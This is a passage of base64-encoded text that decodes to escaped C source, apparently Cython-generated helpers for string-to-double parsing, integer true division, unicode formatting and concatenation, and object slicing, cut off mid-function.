ICAgICAgICAgIG1hdGNoZXMgJj0gKHN0YXJ0WzFdID09IFwnYVwnIHx8IHN0YXJ0WzFdID09IFwnQVwnKTtcbiAgICAgICAgICAgIG1hdGNoZXMgJj0gKHN0YXJ0WzJdID09IFwnblwnIHx8IHN0YXJ0WzJdID09IFwnTlwnKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghbWF0Y2hlcykpIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICAgICAgICAgIHJldHVybiAoc2lnbiA9PSBcJy1cJykgPyAtUHlfTkFOIDogUHlfTkFOO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgY2FzZSBcJ2lcJzpcbiAgICAgICAgY2FzZSBcJ0lcJzpcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShsZW5ndGggPCAzKSkgZ290byBwYXJzZV9mYWlsdXJlO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoc3RhcnRbMV0gPT0gXCduXCcgfHwgc3RhcnRbMV0gPT0gXCdOXCcpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoc3RhcnRbMl0gPT0gXCdmXCcgfHwgc3RhcnRbMl0gPT0gXCdGXCcpO1xuICAgICAgICAgICAgaWYgKGxpa2VseShsZW5ndGggPT0gMyAmJiBtYXRjaGVzKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gKHNpZ24gPT0gXCctXCcpID8gLVB5X0hVR0VfVkFMIDogUHlfSFVHRV9WQUw7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoICE9IDgpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFszXSA9PSBcJ2lcJyB8fCBzdGFydFszXSA9PSBcJ0lcJyk7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFs0XSA9PSBcJ25cJyB8fCBzdGFydFs0XSA9PSBcJ05cJyk7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFs1XSA9PSBcJ2lcJyB8fCBzdGFydFs1XSA9PSBcJ0lcJyk7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFs2XSA9PSBcJ3RcJyB8fCBzdGFydFs2XSA9PSBcJ1RcJyk7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFs3XSA9PSBcJ3lcJyB8fCBzdGFydFs3XSA9PSBcJ1lcJyk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIW1hdGNoZXMpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgICAgICByZXR1cm4gKHNpZ24gPT0gXCctXCcpID8gLVB5X0hVR0VfVkFMIDogUHlfSFVHRV9WQUw7XG4gICAgICAgIGNhc2UgXCcuXCc6IGNhc2UgXCcwXCc6IGNhc2UgXCcxXCc6IGNhc2UgXCcyXCc6IGNhc2UgXCczXCc6IGNhc2UgXCc0XCc6IGNhc2UgXCc1XCc6IGNhc2UgXCc2XCc6IGNhc2UgXCc3XCc6IGNhc2UgXCc4XCc6IGNhc2UgXCc5XCc6XG4gICAgICAgICAgICBicmVhaztcbiAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICB9XG4gICAgcmV0dXJuIDAuMDtcbnBhcnNlX2ZhaWx1cmU6XG4gICAgcmV0dXJuIC0xLjA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGVfSXNTcGFjZShjaGFyIGNoKSB7XG4gICAgcmV0dXJuIChjaCA9PSAweDIwKSB8ICEoKGNoIDwgMHg5KSB8IChjaCA+IDB4ZCkpO1xufVxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgZG91YmxlIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlKFB5T2JqZWN0ICpvYmosIGNvbnN0IGNoYXIqIHN0YXJ0LCBQeV9zc2l6ZV90IGxlbmd0aCkge1xuICAgIGRvdWJsZSB2YWx1ZTtcbiAgICBQeV9zc2l6ZV90IGksIGRpZ2l0cztcbiAgICBjb25zdCBjaGFyICpsYXN0ID0gc3RhcnQgKyBsZW5ndGg7XG4gICAgY2hhciAqZW5kO1xuICAgIHdoaWxlIChfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZV9Jc1NwYWNlKCpzdGFydCkpXG4gICAgICAgIHN0YXJ0Kys7XG4gICAgd2hpbGUgKHN0YXJ0IDwgbGFzdCAtIDEgJiYgX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGVfSXNTcGFjZShsYXN0Wy0xXSkpXG4gICAgICAgIGxhc3QtLTtcbiAgICBsZW5ndGggPSBsYXN0IC0gc3RhcnQ7XG4gICAgaWYgKHVubGlrZWx5KGxlbmd0aCA8PSAwKSkgZ290byBmYWxsYmFjaztcbiAgICB2YWx1ZSA9IF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX2luZl9uYW4oc3RhcnQsIGxlbmd0aCk7XG4gICAgaWYgKHVubGlrZWx5KHZhbHVlID09IC0xLjApKSBnb3RvIGZhbGxiYWNrO1xuICAgIGlmICh2YWx1ZSAhPSAwLjApIHJldHVybiB2YWx1ZTtcbiAgICBkaWdpdHMgPSAwO1xuICAgIGZvciAoaT0wOyBpIDwgbGVuZ3RoOyBkaWdpdHMgKz0gc3RhcnRbaSsrXSAhPSBcJ19cJyk7XG4gICAgaWYgKGxpa2VseShkaWdpdHMgPT0gbGVuZ3RoKSkge1xuICAgICAgICB2YWx1ZSA9IFB5T1Nfc3RyaW5nX3RvX2RvdWJsZShzdGFydCwgJmVuZCwgTlVMTCk7XG4gICAgfSBlbHNlIGlmIChkaWdpdHMgPCA0MCkge1xuICAgICAgICBjaGFyIG51bWJlcls0MF07XG4gICAgICAgIGxhc3QgPSBfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZV9Db3B5KHN0YXJ0LCBudW1iZXIsIGxlbmd0aCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbGFzdCkpIGdvdG8gZmFsbGJhY2s7XG4gICAgICAgIHZhbHVlID0gUHlPU19zdHJpbmdfdG9fZG91YmxlKG51bWJlciwgJmVuZCwgTlVMTCk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgY2hhciAqbnVtYmVyID0gKGNoYXIqKSBQeU1lbV9NYWxsb2MoKGRpZ2l0cyArIDEpICogc2l6ZW9mKGNoYXIpKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFudW1iZXIpKSBnb3RvIGZhbGxiYWNrO1xuICAgICAgICBsYXN0ID0gX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGVfQ29weShzdGFydCwgbnVtYmVyLCBsZW5ndGgpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWxhc3QpKSB7XG4gICAgICAgICAgICBQeU1lbV9GcmVlKG51bWJlcik7XG4gICAgICAgICAgICBnb3RvIGZhbGxiYWNrO1xuICAgICAgICB9XG4gICAgICAgIHZhbHVlID0gUHlPU19zdHJpbmdfdG9fZG91YmxlKG51bWJlciwgJmVuZCwgTlVMTCk7XG4gICAgICAgIFB5TWVtX0ZyZWUobnVtYmVyKTtcbiAgICB9XG4gICAgaWYgKGxpa2VseShlbmQgPT0gbGFzdCkgfHwgKHZhbHVlID09IChkb3VibGUpLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkpIHtcbiAgICAgICAgcmV0dXJuIHZhbHVlO1xuICAgIH1cbmZhbGxiYWNrOlxuICAgIHJldHVybiBfX1B5eF9TbG93UHlTdHJpbmdfQXNEb3VibGUob2JqKTtcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5TnVtYmVyX0Zsb2F0KFB5T2JqZWN0KiBvYmopIHtcbiAgICBkb3VibGUgdmFsO1xuICAgIGlmIChQeUxvbmdfQ2hlY2tFeGFjdChvYmopKSB7XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgICAgIGlmIChsaWtlbHkoX19QeXhfUHlMb25nX0lzQ29tcGFjdChvYmopKSkge1xuICAgICAgICAgICAgdmFsID0gKGRvdWJsZSkgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZShvYmopO1xuICAgICAgICAgICAgZ290byBub19lcnJvcjtcbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIHZhbCA9IFB5TG9uZ19Bc0RvdWJsZShvYmopO1xuICAgIH0gZWxzZSBpZiAoUHlVbmljb2RlX0NoZWNrRXhhY3Qob2JqKSkge1xuICAgICAgICB2YWwgPSBfX1B5eF9QeVVuaWNvZGVfQXNEb3VibGUob2JqKTtcbiAgICB9IGVsc2UgaWYgKFB5Qnl0ZXNfQ2hlY2tFeGFjdChvYmopKSB7XG4gICAgICAgIHZhbCA9IF9fUHl4X1B5Qnl0ZXNfQXNEb3VibGUob2JqKTtcbiAgICB9IGVsc2UgaWYgKFB5Qnl0ZUFycmF5X0NoZWNrRXhhY3Qob2JqKSkge1xuICAgICAgICB2YWwgPSBfX1B5eF9QeUJ5dGVBcnJheV9Bc0RvdWJsZShvYmopO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJldHVybiBQeU51bWJlcl9GbG9hdChvYmopO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkodmFsID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbm5vX2Vycm9yOlxuI2VuZGlmXG4gICAgcmV0dXJuIFB5RmxvYXRfRnJvbURvdWJsZSh2YWwpO1xufVxuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBpbnQgaW5wbGFjZSkge1xuICAgIHJldHVybiAoaW5wbGFjZSA/IFB5TnVtYmVyX0luUGxhY2VUcnVlRGl2aWRlIDogUHlOdW1iZXJfVHJ1ZURpdmlkZSkob3AxLCBvcDIpO1xufVxuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaW5wbGFjZSk7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTtcbiAgICBjb25zdCBsb25nIGIgPSBpbnR2YWw7XG4gICAgbG9uZyBhLCB4O1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNaZXJvKG9wMSkpKSB7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcob3AxLCAmYSkpKSB7XG4gICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKG9wMSk7XG4gICAgICAgIGNvbnN0IFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KG9wMSk7XG4gICAgICAgIHN3aXRjaCAoc2l6ZSkge1xuICAgICAgICAgICAgY2FzZSAtMjpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUICYmIDEgKiBQeUxvbmdfU0hJRlQgPCA1Mykge1xuICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCAmJiAxICogUHlMb25nX1NISUZUIDwgNTMpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBjYXNlIC0zOlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQgJiYgMiAqIFB5TG9uZ19TSElGVCA8IDUzKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQgJiYgMiAqIFB5TG9uZ19TSElGVCA8IDUzKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBjYXNlIC00OlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQgJiYgMyAqIFB5TG9uZ19TSElGVCA8IDUzKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCAmJiAzICogUHlMb25nX1NISUZUIDwgNTMpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgZGVmYXVsdDogcmV0dXJuIFB5TG9uZ19UeXBlLnRwX2FzX251bWJlci0+bmJfdHJ1ZV9kaXZpZGUob3AxLCBvcDIpO1xuICAgICAgICB9XG4gICAgfVxuICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIDw9IDUzIHx8IGxpa2VseShsYWJzKGEpIDw9ICgoUFlfTE9OR19MT05HKTEgPDwgNTMpKSlcbiAgICAgICAgICAgICAgICAgICAgfHwgX19QeXhfUHlMb25nX0RpZ2l0Q291bnQob3AxKSA8PSA1MiAvIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgIHJldHVybiBQeUZsb2F0X0Zyb21Eb3VibGUoKGRvdWJsZSlhIC8gKGRvdWJsZSliKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfVHlwZS50cF9hc19udW1iZXItPm5iX3RydWVfZGl2aWRlKG9wMSwgb3AyKTtcbiAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZyh4KTtcbiAgICBcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GbG9hdF9fX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMoUHlPYmplY3QgKmZsb2F0X3ZhbCwgbG9uZyBpbnR2YWwsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUih6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIGNvbnN0IGxvbmcgYiA9IGludHZhbDtcbiAgICBkb3VibGUgYSA9IF9fUHl4X1B5RmxvYXRfQVNfRE9VQkxFKGZsb2F0X3ZhbCk7XG4gICAgICAgIGRvdWJsZSByZXN1bHQ7XG4gICAgICAgIFxuICAgICAgICByZXN1bHQgPSAoKGRvdWJsZSlhKSAvIChkb3VibGUpYjtcbiAgICAgICAgcmV0dXJuIFB5RmxvYXRfRnJvbURvdWJsZShyZXN1bHQpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbnR2YWwpO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAgIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3Qob3AxKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1VucGFja2VkX19fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICBpZiAoUHlGbG9hdF9DaGVja0V4YWN0KG9wMSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhvcDEsIGludHZhbCwgemVyb2RpdmlzaW9uX2NoZWNrKTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhvcDEsIG9wMiwgaW5wbGFjZSk7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9Gb3JtYXQoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGZvcm1hdF9zcGVjKSB7XG4gICAgaW50IHJldDtcbiAgICBfUHlVbmljb2RlV3JpdGVyIHdyaXRlcjtcbiAgICBpZiAobGlrZWx5KFB5RmxvYXRfQ2hlY2tFeGFjdChvYmopKSkge1xuICAgICAgICBfUHlVbmljb2RlV3JpdGVyX0luaXQoJndyaXRlcik7XG4gICAgICAgIHJldCA9IF9QeUZsb2F0X0Zvcm1hdEFkdmFuY2VkV3JpdGVyKFxuICAgICAgICAgICAgJndyaXRlcixcbiAgICAgICAgICAgIG9iaixcbiAgICAgICAgICAgIGZvcm1hdF9zcGVjLCAwLCBQeVVuaWNvZGVfR0VUX0xFTkdUSChmb3JtYXRfc3BlYykpO1xuICAgIH0gZWxzZSBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KG9iaikpKSB7XG4gICAgICAgIF9QeVVuaWNvZGVXcml0ZXJfSW5pdCgmd3JpdGVyKTtcbiAgICAgICAgcmV0ID0gX1B5TG9uZ19Gb3JtYXRBZHZhbmNlZFdyaXRlcihcbiAgICAgICAgICAgICZ3cml0ZXIsXG4gICAgICAgICAgICBvYmosXG4gICAgICAgICAgICBmb3JtYXRfc3BlYywgMCwgUHlVbmljb2RlX0dFVF9MRU5HVEgoZm9ybWF0X3NwZWMpKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gUHlPYmplY3RfRm9ybWF0KG9iaiwgZm9ybWF0X3NwZWMpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkocmV0ID09IC0xKSkge1xuICAgICAgICBfUHlVbmljb2RlV3JpdGVyX0RlYWxsb2MoJndyaXRlcik7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gX1B5VW5pY29kZVdyaXRlcl9GaW5pc2goJndyaXRlcik7XG59XG4jZW5kaWZcblxuXG4jIGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIGludFxuX19QeXhfdW5pY29kZV9tb2RpZmlhYmxlKFB5T2JqZWN0ICp1bmljb2RlKVxue1xuICAgIGlmIChQeV9SRUZDTlQodW5pY29kZSkgIT0gMSlcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgaWYgKCFQeVVuaWNvZGVfQ2hlY2tFeGFjdCh1bmljb2RlKSlcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgaWYgKFB5VW5pY29kZV9DSEVDS19JTlRFUk5FRCh1bmljb2RlKSlcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgcmV0dXJuIDE7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VJbXBsKFB5T2JqZWN0ICoqcF9sZWZ0LCBQeU9iamVjdCAqcmlnaHRcbiAgICAgICAgI2lmIENZVEhPTl9SRUZOQU5OWVxuICAgICAgICAsIHZvaWQqIF9fcHl4X3JlZm5hbm55XG4gICAgICAgICNlbmRpZlxuICAgICkge1xuICAgIFB5T2JqZWN0ICpsZWZ0ID0gKnBfbGVmdDtcbiAgICBQeV9zc2l6ZV90IGxlZnRfbGVuLCByaWdodF9sZW4sIG5ld19sZW47XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShsZWZ0KSA9PSAtMSkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkocmlnaHQpID09IC0xKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgbGVmdF9sZW4gPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChsZWZ0KTtcbiAgICBpZiAobGVmdF9sZW4gPT0gMCkge1xuICAgICAgICBQeV9JTkNSRUYocmlnaHQpO1xuICAgICAgICByZXR1cm4gcmlnaHQ7XG4gICAgfVxuICAgIHJpZ2h0X2xlbiA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHJpZ2h0KTtcbiAgICBpZiAocmlnaHRfbGVuID09IDApIHtcbiAgICAgICAgUHlfSU5DUkVGKGxlZnQpO1xuICAgICAgICByZXR1cm4gbGVmdDtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KGxlZnRfbGVuID4gUFlfU1NJWkVfVF9NQVggLSByaWdodF9sZW4pKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgInN0cmluZ3MgYXJlIHRvbyBsYXJnZSB0byBjb25jYXQiKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIG5ld19sZW4gPSBsZWZ0X2xlbiArIHJpZ2h0X2xlbjtcbiAgICBpZiAoX19QeXhfdW5pY29kZV9tb2RpZmlhYmxlKGxlZnQpXG4gICAgICAgICAgICAmJiBQeVVuaWNvZGVfQ2hlY2tFeGFjdChyaWdodClcbiAgICAgICAgICAgICYmIFB5VW5pY29kZV9LSU5EKHJpZ2h0KSA8PSBQeVVuaWNvZGVfS0lORChsZWZ0KVxuICAgICAgICAgICAgJiYgIShQeVVuaWNvZGVfSVNfQVNDSUkobGVmdCkgJiYgIVB5VW5pY29kZV9JU19BU0NJSShyaWdodCkpKSB7XG4gICAgICAgIGludCByZXQ7XG4gICAgICAgIF9fUHl4X0dJVkVSRUYoKnBfbGVmdCk7XG4gICAgICAgIHJldCA9IFB5VW5pY29kZV9SZXNpemUocF9sZWZ0LCBuZXdfbGVuKTtcbiAgICAgICAgX19QeXhfR09UUkVGKCpwX2xlZnQpO1xuICAgICAgICBpZiAodW5saWtlbHkocmV0ICE9IDApKVxuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgICAgIGlmICh1bmxpa2VseShQeVVuaWNvZGVfQ29weUNoYXJhY3RlcnMoKnBfbGVmdCwgbGVmdF9sZW4sIHJpZ2h0LCAwLCByaWdodF9sZW4pIDwgMCkpIHJldHVybiBOVUxMO1xuICAgICAgICAjZWxzZVxuICAgICAgICBfUHlVbmljb2RlX0Zhc3RDb3B5Q2hhcmFjdGVycygqcF9sZWZ0LCBsZWZ0X2xlbiwgcmlnaHQsIDAsIHJpZ2h0X2xlbik7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBfX1B5eF9JTkNSRUYoKnBfbGVmdCk7XG4gICAgICAgIF9fUHl4X0dJVkVSRUYoKnBfbGVmdCk7XG4gICAgICAgIHJldHVybiAqcF9sZWZ0O1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KGxlZnQsIHJpZ2h0KTtcbiAgICB9XG4gIH1cbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRTbGljZShQeU9iamVjdCogb2JqLFxuICAgICAgICBQeV9zc2l6ZV90IGNzdGFydCwgUHlfc3NpemVfdCBjc3RvcCxcbiAgICAgICAgUHlPYmplY3QqKiBfcHlfc3RhcnQsIFB5T2JqZWN0KiogX3B5X3N0b3AsIFB5T2JqZWN0KiogX3B5X3NsaWNlLFxuICAgICAgICBpbnQgaGFzX2NzdGFydCwgaW50IGhhc19jc3RvcCwgQ1lUSE9OX1VOVVNFRCBpbnQgd3JhcGFyb3VuZCkge1xuICAgIF9fUHl4X1R5cGVOYW1lIG9ial90eXBlX25hbWU7XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgUHlNYXBwaW5nTWV0aG9kcyogbXAgPSBQeV9UWVBFKG9iaiktPnRwX2FzX21hcHBpbmc7XG4gICAgaWYgKGxpa2VseShtcCAmJiBtcC0+bXBfc3Vic2NyaXB0KSlcbiNlbmRpZlxuICAgIHtcbiAgICAgICAgUHlPYmplY3QqIHJlc3VsdDtcbiAgICAgICAgUHlPYmplY3QgKnB5X3NsaWNlLCAqcHlfc3RhcnQsICpweV9zdG9wO1xuICAgICAgICBpZiAoX3B5X3NsaWNlKSB7XG4gICAgICAgICAgICBweV9zbGljZSA9ICpfcHlfc2xpY2U7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeU9iamVjdCogb3duZWRfc3RhcnQgPSBOVUxMO1xuICAgICAgICAgICAgUHlPYmplY3QqIG93bmVkX3N0b3AgPSBOVUxMO1xuICAgICAgICAgICAgaWYgKF9weV9zdGFydCkge1xuICAgICAgICAgICAgICAgIHB5X3N0YXJ0ID0gKl9weV9zdGFydDtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgaWYgKGhhc19jc3RhcnQpIHtcbiAgICAgICAgICAgICAgICAgICAgb3duZWRfc3RhcnQgPSBweV9zdGF